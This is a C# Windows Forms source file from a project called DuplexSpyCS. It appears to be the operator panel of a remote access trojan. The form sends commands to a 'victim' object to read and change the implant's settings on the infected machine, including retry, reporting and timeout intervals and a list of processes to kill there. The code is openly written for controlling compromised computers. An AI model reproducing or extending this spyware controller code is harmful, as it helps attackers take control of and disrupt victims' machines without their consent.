using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmClientConfig : Form
    {
        public clsVictim m_victim { get; init; }


        private List<string> lsProcName = new List<string>();

        public frmClientConfig(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
        }

        public void ShowConfig(ClientConfig config)
        {
            Invoke(new Action(() =>
            {
                //General
                textBox1.Text = config.szOnlineID;
                radioButton1.Checked = config.bKillProcess;
                radioButton2.Checked = !radioButton1.Checked;
                numericUpDown1.Value = config.dwRetry;
                numericUpDown2.Value = config.dwSendInfo;
                numericUpDown3.Value = config.dwTimeout;

                toolStripStatusLabel1.Text = "Action successfully.";
            }));
        }

        void SendSet()
        {
            Dictionary<string, string> dic = new Dictionary<string, string>
            {
                { "ID", textBox1.Text },
                { "bAntiProc", radioButton1.Checked ? "1" : "0" },
                { "lsAntiProc", string.Join(",", lsProcName) },
                { "dwRetry", numericUpDown1.Value.ToString() },
                { "dwSendInfo", numericUpDown2.Value.ToString() },
                { "dwTimeout", numericUpDown3.Value.ToString() },
            };

            string szPayload = string.Join(";", dic.Select(x => $"{x.Key}:{dic[x.Key]}").ToArray());
            m_victim.SendCommand($"detail|client|set|{szPayload}");
        }

        void setup()
        {
            //Controls
            radioButton2.Checked = true;

            m_victim.SendCommand($"detail|client|info");
            toolStripStatusLabel1.Text = "Loading...";
        }

        private void frmClientConfig_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            SendSet();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            frmKillProc f = new frmKillProc();
            f.lsProc = lsProcName;
            f.StartPosition = FormStartPosition.CenterScreen;
            f.Text = "Kill Process";

            f.ShowDialog();

            lsProcName = f.lsProc;
            f.Dispose();
        }
    }
}
